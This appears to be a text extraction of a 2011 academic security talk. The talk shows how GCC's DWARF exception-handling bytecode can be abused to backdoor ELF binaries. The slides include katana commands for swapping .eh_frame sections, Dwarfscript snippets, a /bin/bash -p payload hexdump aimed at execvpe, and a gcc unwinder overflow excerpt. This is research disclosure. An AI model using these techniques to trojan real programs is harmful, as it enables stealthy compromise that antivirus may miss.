@@ -1,0 +1,318 @@
+<?xml version="1.0" ?>
+<Presentation>
+  <div class="page">
+    <p>Exploiting the Hard-Working DWARF</p>
+    <p>PH-Neutral 0x7db</p>
+    <p>James Oakley &amp; Sergey Bratus</p>
+    <p>Dartmouth College Trust Lab</p>
+    <p>May 28, 2011</p>
+    <p>W00T 2011</p>
+  </div>
+  <div class="page">
+    <p>Executive Summary  All GCC-compiled binaries that support exception handling</p>
+    <p>include DWARF bytecode</p>
+    <p>describes stack frame layout</p>
+    <p>interpreted to unwind the stack after exception occurs</p>
+    <p>Process image will include the interpreter of DWARF bytecode (part of the standard GNU C++ runtime)</p>
+    <p>Bytecode can be written to have the interpreter perform almost any computation (Turing-complete), including any one library/system call.</p>
+    <p>N.B. This is not about debugging: will work with stripped executables.</p>
+  </div>
+  <div class="page">
+    <p>What This Is and What It Is Not</p>
+    <p>Is a new Turing-complete computational model most programmers dont fully understand lurking in every C++</p>
+    <p>program.</p>
+    <p>Is a demonstrated trojan backdoor inserted in an area usually ignored.</p>
+    <p>Is a new mechanism to gain Turing-complete computation in an exploit.</p>
+    <p>Is a released binary extraction and manipulation tool.</p>
+    <p>Not a full memory-corruption/exploit by itself.</p>
+    <p>Not SEH overwriting; UNIX exceptions work differently.</p>
+  </div>
+  <div class="page">
+    <p>Inspirations</p>
+    <p>We owe a debt of thanks to many other projects and articles which have inspired us. Among these are:</p>
+    <p>elfsh and the ERESI project.</p>
+    <p>The Grugq. Cheating the ELF</p>
+    <p>Nergal. The advanced return-into-lib(c) exploits: PaX case study</p>
+    <p>Skape. LOCREATE. For showing the power of overlooked automata.</p>
+  </div>
+  <div class="page">
+    <p>DWARF Abilities (1)</p>
+    <p>DWARF allows an attacker to create a trojan payload for ELF executables without any native binary code.</p>
+    <p>As far as we know, not detected by antivirus software  Some testing done with F-Prot and Bitdefender.</p>
+    <p>When combined with traditional exploits, can be used as an alternative Turing-complete environment to ROP.</p>
+  </div>
+  <div class="page">
+    <p>DWARF Abilities (2)</p>
+    <p>Since DWARF is so flexible, it can defeat ASLR.</p>
+    <p>We have written a complete dynamic linker in DWARF.</p>
+  </div>
+  <div class="page">
+    <p>Lets build this enormous wooden rabbit</p>
+  </div>
+  <div class="page">
+    <p>Digging Deeper</p>
+  </div>
+  <div class="page">
+    <p>DWARF power!</p>
+    <p>DWARF bytecode is a complete programming environment that</p>
+    <p>can read arbitrary process memory</p>
+    <p>can perform arbitrary computations with values in registers and in memory</p>
+    <p>is meant to influence the flow of the program</p>
+    <p>knows where the gold is Originally, debugging tool; then stack unwinding tool</p>
+  </div>
+  <div class="page">
+    <p>That Ax Hacks Exception Handling</p>
+    <p>gcc, the Linux Standards Base, and the x86 64 ABI have adopted a format very similar to .debug frame for describing how to unwind the stack during exception handling. This is .eh frame.</p>
+    <p>Not identical to DWARF specification</p>
+    <p>Adds pointer encoding and defines certain language-specific data (allowed for by DWARF)</p>
+    <p>See standards for more information.  Some formats discussed are standardized under the Linux</p>
+    <p>Standards Base</p>
+    <p>Some under the x86 64 ABI.</p>
+    <p>Some are at the whim of gcc maintainers.</p>
+  </div>
+  <div class="page">
+    <p>ELF Layout</p>
+    <p>On Linux (and BSD and Solaris)</p>
+    <p>an executable binary file looks</p>
+    <p>roughly like this on disk and</p>
+    <p>in-memory.</p>
+    <p>We are going to look at the</p>
+    <p>highlighted sections.</p>
+  </div>
+  <div class="page">
+    <p>ELF Runtime (with Dwarves)</p>
+    <p>This is actually a virtual machine and its byte code</p>
+  </div>
+  <div class="page">
+    <p>Structure of .eh frame</p>
+    <p>Conceptually, represents a table which for every address in program text describes how to set registers to restore the previous call frame.</p>
+    <p>program counter (eip) CFA ebp ebx eax return address 0xf000f000 rsp+16 *(cfa-16) *(cfa-8) 0xf000f001 rsp+16 *(cfa-16) *(cfa-8) 0xf000f002 rbp+16 *(cfa-16) eax=edi *(cfa-8)</p>
+    <p>.</p>
+    <p>.</p>
+    <p>. . . .</p>
+    <p>.</p>
+    <p>.</p>
+    <p>. . . .</p>
+    <p>.</p>
+    <p>.</p>
+    <p>. . . .</p>
+    <p>Canonical Frame Address (CFA). Address other addresses within the call frame can be relative to.</p>
+    <p>Each row shows how the given text location can return to the previous frame.</p>
+  </div>
+  <div class="page">
+    <p>Structure of .eh frame  This table would be humongous</p>
+    <p>Larger than the whole program!  Blank columns  Duplication</p>
+    <p>Instead, the DWARF/eh frame is essentially data compression: bytecode to generate needed parts of the table.</p>
+    <p>Bytecode is everything required to build the table, compute memory locations, and more.</p>
+    <p>Portions of the table are built only as needed.</p>
+  </div>
+  <div class="page">
+    <p>CIE and FDE Structure Important Data Members</p>
+    <p>initial location and address range: Together determine instructions</p>
+    <p>this FDE applies to.</p>
+    <p>augmentation: Specifies platform/language specific</p>
+    <p>additions to the CIE/FDE</p>
+    <p>information.</p>
+    <p>return address register: Number of a column in the virtual table which</p>
+    <p>will hold the text location to return</p>
+    <p>to (i.e. set eip to).</p>
+    <p>instructions: Here is where the table rules are encoded. DWARF</p>
+    <p>has its own embedded language to</p>
+    <p>describe the virtual table . . . .</p>
+  </div>
+  <div class="page">
+    <p>DWARF Instructions Sample</p>
+    <p>DW CFA set loc N Following instructions only apply to instructions N bytes from</p>
+    <p>the start of the procedure.</p>
+    <p>DW CFA def cfa R OFF The CFA is calculated from the given register R and offset</p>
+    <p>OFF</p>
+    <p>DW CFA offset R OFF Register R is restored to the value stored at OFF from the</p>
+    <p>CFA.</p>
+    <p>DW CFA register R1 R2 Register R1 is restored to the contents of register R2.</p>
+  </div>
+  <div class="page">
+    <p>DWARF Expressions  DWARF designers could not anticipate all unwinding</p>
+    <p>mechanisms any system might use. Therefore, they built in</p>
+    <p>flexibility. . .</p>
+    <p>DW CFA expression R EXPRESSION R restored to value stored at result of EXPRESSION.</p>
+    <p>DW CFA val expression R EXPRESSION R restored to result of EXPRESSION</p>
+    <p>Expressions have their own set of instructions, including  Constant values: DW OP constu, DW OP const8s, etc.  Arithmetic: DW OP plus, DW OP mul, DW OP and,</p>
+    <p>DW OP xor, etc.</p>
+    <p>Memory dereference: DW OP deref  Register contents: DW OP bregx  Control flow: DW OP le, DW OP skip, DW OP bra, etc</p>
+  </div>
+  <div class="page">
+    <p>DWARF - The Other Assembly</p>
+    <p>DWARF Expressions function essentially like an embedded assembly language  in a place where few expect it.</p>
+    <p>Turing-complete stack-based machine. Computation works like an RPN calculator.</p>
+    <p>Can dereference memory and access values in machine registers.</p>
+    <p>There are limitations:  No side effects (i.e. no writing to registers or memory)  Current gcc (4.5.2) limits the computation stack to 64 words.</p>
+  </div>
+  <div class="page">
+    <p>With Existing Tools</p>
+    <p>[james@neutrino exec]$readelf --debug-dump=frames exec Contents of the .eh_frame section:</p>
+    <p>DW_CFA_def_cfa: r7 (rsp) ofs 8 DW_CFA_offset: r16 (rip) at cfa-8 DW_CFA_nop DW_CFA_nop</p>
+    <p>(or objdump or dwarfdump) But this doesnt let us modify anything.</p>
+  </div>
+  <div class="page">
+    <p>Introducing Katana and Dwarfscript</p>
+    <p>katana is an ELF-modification shell/tool we developed. http://katana.nongnu.org</p>
+    <p>ELF manipulation inspired by elfsh from the ERESI project.</p>
+    <p>Dwarfscript is an assembly language that katana can emit . . .</p>
+    <p>[james@neutrino example1]$katana &gt; $e=load &quot;demo&quot; Loaded ELF &quot;demo&quot; &gt; dwarfscript emit &quot;.eh_frame&quot; $e &quot;demo.dws&quot; Wrote dwarfscript to demo.dws</p>
+  </div>
+  <div class="page">
+    <p>An Assembly for Dwarfscript</p>
+    <p>. . . and katana includes an assembler for</p>
+    <p>[james@neutrino example1]$katana &gt; $e=load &quot;demo&quot; Loaded ELF &quot;demo&quot; &gt; $ehframe=dwarfscript compile &quot;demo.dws&quot; &gt; replace section $e &quot;.eh_frame&quot; $ehframe[0] Replaced section &quot;.eh_frame&quot; &gt; save $e &quot;demo_rebuilt&quot; Saved ELF object to &quot;demo_rebuilt&quot; &gt; !chmod +x demo_rebuilt</p>
+  </div>
+  <div class="page">
+    <p>Dwarfscript Example</p>
+    <p>begin CIE index : 1 v e r s i o n : 1 d a t a a l i g n : 8 c o d e a l i g n : 1 r e t u r n a d d r r u l e : 16 f d e p t r e n c : DW EH PE sdata4 , DW EH PE pcrel begin INSTRUCTIONS DW CFA def cfa r7 8 DW CFA offset r16 1 end INSTRUCTIONS end CIE begin FDE index : 0 c i e i n d e x : 0 i n i t i a l l o c a t i o n : 0 x400824 a d d r e s s r a n g e : 0xb9 l s d a p o i n t e r : 0 x400ab4 begin INSTRUCTIONS DW CFA advance loc 1 DW CFA def cfa offset 16 DW CFA advance loc 3 DW CFA offset r6 2 DW CFA def cfa register r6</p>
+    <p>We can modify all of these CIE/FDE structures and DWARF instructions. We then compile the dwarfscript back into binary DWARF information in an ELF section using Katana.</p>
+  </div>
+  <div class="page">
+    <p>What Else Can We Do?</p>
+    <p>With DWARF Expressions we can do so much!</p>
+    <p>Redirect exceptions.</p>
+    <p>Find functions/resolve symbols.</p>
+    <p>Calculate relocations.</p>
+  </div>
+  <div class="page">
+    <p>I Want To Do More!</p>
+    <p>OK. So we can set registers and redirect unwinding.</p>
+    <p>But how do we exit the unwinder? We found a function we</p>
+    <p>want to stop at!</p>
+    <p>Control of .eh frame alone is not enough. We still are only able to land in catch blocks.</p>
+    <p>The DWARF standard doesnt cover when to stop unwinding.</p>
+    <p>Neither does the x86 64 ABI.</p>
+    <p>Neither does the Linux Standards Base.</p>
+  </div>
+  <div class="page">
+    <p>.gcc except table</p>
+    <p>[james@neutrino example1]$readelf -S demo</p>
+    <p>...</p>
+    <p>[16] .eh_frame_hdr PROGBITS 00000000004009e8 000009e8</p>
+    <p>[17] .eh_frame PROGBITS 0000000000400a10 00000a10</p>
+    <p>[18] .gcc_except_table PROGBITS 0000000000400ab4 00000ab4</p>
+    <p>...</p>
+    <p>We know .eh frame now. Ever wondered what you could do with .gcc except table?</p>
+  </div>
+  <div class="page">
+    <p>.gcc except table</p>
+    <p>Holds language specific data i.e. information about where exception handlers live.</p>
+    <p>Interpreted by the personality routine.</p>
+    <p>Controls allows us to stop exception unwinding/propagation at any point.</p>
+    <p>Unlike .eh frame, .gcc except table is not governed by any standard.</p>
+    <p>Almost no documentation. What documentation there is resides mostly in verbose assembly generated by gcc.</p>
+  </div>
+  <div class="page">
+    <p>.gcc except table Assembly Generated by GCC</p>
+    <p>The following assembly is generated by passing the flags --save-temps -fverbose-asm -dA to gcc when compiling.</p>
+    <p>.section .gcc_except_table,&quot;a&quot;,@progbits</p>
+    <p>.align 4 .LLSDA963: .byte 0xff # @LPStart format (omit) .byte 0x3 # @TType format (udata4) .uleb128 .LLSDATT963!.LLSDATTD963 # @TType base offset</p>
+    <p>.LLSDATTD963: .byte 0x1 # call!site format (uleb128) .uleb128 .LLSDACSE963!.LLSDACSB963 # Call!site table length</p>
+    <p>.LLSDACSB963: .uleb128 .LEHB0!.LFB963 # region 0 start .uleb128 .LEHE0!.LEHB0 # length .uleb128 .L6!.LFB963 # landing pad .uleb128 0x1 # action .uleb128 .LEHB1!.LFB963 # region 1 start .uleb128 .LEHE1!.LEHB1 # length .uleb128 0x0 # landing pad .uleb128 0x0 # action .uleb128 .LEHB2!.LFB963 # region 2 start .uleb128 .LEHE2!.LEHB2 # length .uleb128 .L7!.LFB963 # landing pad .uleb128 0x0 # action</p>
+    <p>.LLSDACSE963: .byte 0x1 # Action record table .byte 0x0 .align 4 .long _ZTIi</p>
+  </div>
+  <div class="page">
+    <p>.gcc except table Layout</p>
+  </div>
+  <div class="page">
+    <p>Exception Handling Flow</p>
+    <p>Most of this interface is standardized by ABI. The personality routine is language and implementation specific.</p>
+    <p>How does libgcc know how to unwind?</p>
+    <p>How is an exception handler recognized?</p>
+  </div>
+  <div class="page">
+    <p>.gcc except table Dwarfscript</p>
+  </div>
+  <div class="page">
+    <p>What Can We Do With This?</p>
+    <p>Backdoor a program that performs normally . . .</p>
+    <p>. . . until an exception is thrown.</p>
+    <p>Return from an exception anywhere in the program with control over most of the registers (including the frame-pointer).</p>
+    <p>Modify no executable or normal program data sections.</p>
+  </div>
+  <div class="page">
+    <p>Bring Your Own Linker</p>
+    <p>Starting with the static address of the beginning of the linkmap, a</p>
+    <p>DWARF expression can perform all the computations the dynamic</p>
+    <p>linker does. The complete code is less than 200 bytes and uses less</p>
+    <p>than 20 words of the computation stack.</p>
+    <p>DW CFA val expression r6</p>
+    <p>begin EXPRESSION</p>
+    <p>DW OP constu 0x601218 #the address where we w i l l f i n d</p>
+    <p>#the address of the linkmap . This i s 8 more than the</p>
+    <p>#value of PLTGOT in . dynamic</p>
+    <p>DW OP deref #d e r e f e r e n c e above</p>
+    <p>DW OP lit5</p>
+    <p>DW OP swap</p>
+    <p>DW OP lit24</p>
+    <p>DW OP plus</p>
+    <p>DW OP deref</p>
+    <p>. . . . .</p>
+  </div>
+  <div class="page">
+    <p>Data for the Shell</p>
+    <p>We inserted the name of the symbol we wanted (execvpe) and arguments to it into extra space in .gcc except table.</p>
+    <p>[james@electron demo]$hexdump -C shell.dat 00000000 2f 62 69 6e 2f 62 61 73 68 00 2d 70 00 00 2c 0f |/bin/bash.-p..,.| 00000010 40 00 00 00 00 00 36 0f 40 00 00 00 00 00 00 00 |@.....6.@.......| 00000020 00 00 00 00 00 00 65 78 65 63 76 70 65 |......execvpe| 0000002d</p>
+  </div>
+  <div class="page">
+    <p>Setting up Arguments</p>
+    <p>These are the arguments to execve. Note that DWARF register</p>
+    <p>r3 maps to rbx</p>
+    <p>DW CFA val expression r14</p>
+    <p>begin EXPRESSION</p>
+    <p>#s e t to address of / bin / bash</p>
+    <p>DW OP constu 0 x400f2c</p>
+    <p>end EXPRESSION</p>
+    <p>DW CFA val expression r3</p>
+    <p>begin EXPRESSION</p>
+    <p>#s e t to address of address of s t r i n g a rray p DW OP constu 0 x400f3a</p>
+    <p>end EXPRESSION</p>
+    <p>DW CFA val expression r12</p>
+    <p>begin EXPRESSION</p>
+    <p>#s e t to NULL p o i n t e r</p>
+    <p>DW OP constu 0</p>
+    <p>end EXPRESSION</p>
+  </div>
+  <div class="page">
+    <p>Jump to a Convenient Place</p>
+    <p>We choose a specific offset into execvpe where we will be able to set up registers that DWARF lets us control.</p>
+    <p>a074d : 4c 89 e2 mov %r12 ,% rdx a0750 : 48 89 de mov %rbx ,% r s i a0753 : 4c 89 f7 mov %r14 ,% r d i a0756 : e8 35 f9 f f f f c a l l q a0090 &lt;execve&gt;</p>
+  </div>
+  <div class="page">
+    <p>Corruption</p>
+    <p>Everything weve discussed so far deals with valid ELF files, valid DWARF files, playing entirely within the rules that have been defined.</p>
+    <p>What if we could corrupt a process to replace the exception handling data?</p>
+    <p>What if our DWARF data violated assumptions made by gccs VM?</p>
+  </div>
+  <div class="page">
+    <p>Crafted DWARF Instructions  DW CFA offset extended and some other instructions are</p>
+    <p>vulnerable to array overflow. From gcc/unwind-dw2.c:</p>
+    <p>case DW CFA offset extended :</p>
+    <p>i n s n p t r = read uleb128 ( i n s n p t r , &amp;reg ) ;</p>
+    <p>i n s n p t r = read uleb128 ( i n s n p t r , &amp;utmp ) ;</p>
+    <p>o f f s e t = ( Unwind Sword ) utmp  fs &gt;d a t a a l i g n ; fs &gt;regs . reg [DWARF REG TO UNWIND COLUMN ( reg ) ] . how = REG SAVED OFFSET ;</p>
+    <p>fs &gt;regs . reg [DWARF REG TO UNWIND COLUMN ( reg ) ] . l o c . o f f s e t = o f f s e t ; break ;</p>
+    <p>We can achieve fairly arbitrary writes to the stack with crafted Dwarfscript. This addresses the no side effects limitation.</p>
+    <p>We barely scratched the surface here -To Be Continued</p>
+  </div>
+  <div class="page">
+    <p>Inspirations</p>
+    <p>We owe a debt of thanks to many other projects and articles which have inspired us. Among these are:</p>
+    <p>elfsh and the ERESI project.</p>
+    <p>The Grugq. Cheating the ELF</p>
+    <p>Nergal. The advanced return-into-lib(c) exploits: PaX case study</p>
+    <p>Skape. LOCREATE. For showing the power of overlooked automata.</p>
+    <p>Hacker research contains deep computational ideas and intuitions (Phrack, Uninformed.org, ...)</p>
+    <p>Inspirations, once again</p>
+  </div>
+  <div class="page">
+    <p>Further Reading</p>
+    <p>Slides and code will be made available at http://cs.dartmouth.edu/~sergey/battleaxe</p>
+    <p>There are ELFs and DWARFs but no ORCs (yet anyway)</p>
+    <p>Further Reading  The DWARF Standard http://dwarfstd.org  The x86 64 ABI (or the relevant ABI for your platform)  The Linux Standards Base  The gcc source code and mailing lists</p>
+    <p>Questions?</p>
+  </div>
+</Presentation>
